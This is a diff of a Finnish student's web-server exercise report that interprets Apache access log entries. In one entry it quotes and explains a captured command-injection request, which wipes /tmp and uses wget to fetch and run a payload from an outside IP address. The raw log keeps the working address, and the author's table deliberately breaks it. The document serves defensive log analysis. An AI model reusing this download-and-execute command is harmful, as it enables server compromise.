@@ -113,7 +113,7 @@ Kotisivut toimivat. Testasin vielä matkapuhelimella toiminnan. Näyttää hyvä
 20.122.1.130 - - [14/Feb/2022:09:36:35 +0000] "HEAD /robots.txt HTTP/1.0" 404 159 "-" "-"  
   
 Puretaan ylempää osiin [tämän](https://httpd.apache.org/docs/current/logs.html#common) tulkintaohjeen mukaisesti:  
-Tieto | Selitys
+Tietue | Selitys
 ---|---
 20.122.1.130 | IP-osoite josta pyyntö tapahtumalle tuli. Yhdysvaltalainen IP-osoite, joka [ip-info.io](https://ipinfo.io/20.122.1.130) sivuston mukaan kuuluisi Microsoftille.    
 \- | Tieto ei saatavilla. Pitäisi sisällään RCF 1413 identiteetin (ident).  
@@ -132,19 +132,19 @@ Jouduin hetken aikaa tarkkailemaan uusia pyyntöjä (sudo tail -f /var/log/apach
 104.35.176.251 - - [14/Feb/2022:10:12:48 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://23.94.7.175/.s4y/arm;sh+/tmp/arm" 400 477 "-" "-"  
   
 Näyttää jo huomattavasti epäilyttävämmältä. Puretaan taas osiin:  
-Tieto | Selitys
+Tietue | Selitys
 ---|---
 104.35.176.251 | IP-osoite josta pyyntö tapahtumalle tuli. Kyseisestä IP-osoitteesta selviää Maltiverse.com sivustolta, että se on tunnettu hyökkääjä: "This IP Address has been seen sending attacks over the Internet.". IP-osoite sijaitsee jälleen Yhdysvalloissa.     
 \- | Tieto ei saatavilla. Pitäisi sisällään RCF 1413 identiteetin (ident).  
 \- | HTTP tunnistautumisen ilmoittama käyttäjätunniste, joka tässä tapauksessa myös tyhjä.  
 [14/Feb/2022:10:12:48 +0000] | Päivämäärä, kellonaika ja aikavyöhyke +-UTF muodossa. Tässä UTF +0 eli ajat ovat kaksi tuntia jäljessä Suomen aikaan verrattuna.  
-"GET /shell?cd+/tmp;rm+-rf+*;wget+http;//23,94,7,175/,s4y/arm;sh+/tmp/arm" (linkki rikottu minun toimestani) | Hyökkääjä pyytää (GET) resurssia ja antaa parametreiksi koodin pätkän. Tällä koodilla hän yrittää avata shell istunnon, navigoida root sijainnin väliaikaistiedostoihin (cd /tmp), poistaa koko tmp kansion sisällön alikansioineen (rm -rf *), ja ladata verkosta kansioon oman ohjelmansa wget -komennolla. Lopuksi hän pyrkii suorittamaan kyseisen ohjelman sh komennolla.   
+"GET /shell?cd+/tmp;rm+-rf+*;wget+http;//23,94,7,175/,s4y/arm;sh+/tmp/arm" (http linkki rikottu minun toimestani) | Hyökkääjä pyytää (GET) resurssia ja antaa parametreiksi koodin pätkän. Tällä koodilla hän yrittää avata shell istunnon, navigoida root sijainnin väliaikaistiedostoihin (cd /tmp), poistaa koko tmp kansion sisällön alikansioineen (rm -rf *), ja ladata verkosta kansioon oman ohjelmansa wget -komennolla. Lopuksi hän pyrkii suorittamaan kyseisen ohjelman sh komennolla.   
 400 | Statuskoodi, jonka palvelin ilmoitti takaisin käyttäjälle.  [400 Bad Request](https://en.wikipedia.org/wiki/HTTP_400) eli esitetty pyynnössä oli jotain vikaa.  
 477 | Käyttäjälle palautetun tiedoston koko tavuina.  
 \-| Referoija eli miltä sivulta pyyntö tuli.  
 \- | Järjestelmä ja selaintiedot jotka käyttäjän selain ilmoitti.  
   
-Kyseessä oli selkeä hyökkäysyritys, jossa tunkeutuja yrittää ottaa komentorivin haltuunsa koodi-injektiolla, ladata palvelimelle oletettavasti haitallisen sovelluksen ja käynnistää sen. Hyökkääjän käyttämä pyyntö todettiin kuitenkin palvelimen puolella vialliseksi joten hyökkäys ei edennyt. Nopea katsaus ls -la komennolla /tmp kansioon myös paljastaa, että siellä a) on useita tiedostoja ja kansioita ja b) ei ole hyökkääjän lataamaan sijaintia.   
+Kyseessä oli selkeä hyökkäysyritys, jossa tunkeutuja yrittää ottaa komentorivin haltuunsa koodi-injektiolla, ladata palvelimelle oletettavasti haitallisen sovelluksen ja käynnistää sen. Hyökkääjän käyttämä pyyntö todettiin kuitenkin palvelimen puolella vialliseksi joten hyökkäys ei edennyt. Nopea katsaus ls -la komennolla /tmp kansioon myös paljastaa, että siellä a) on useita tiedostoja ja kansioita ja b) ei ole hyökkääjän lataamaa sijaintia.   
    
 ### c) Vapaaehtoinen: Laita TLS-salakirjoitus (https) toimimaan Let's Encrypt avulla. Vinkki: certbot tai lego.  
   
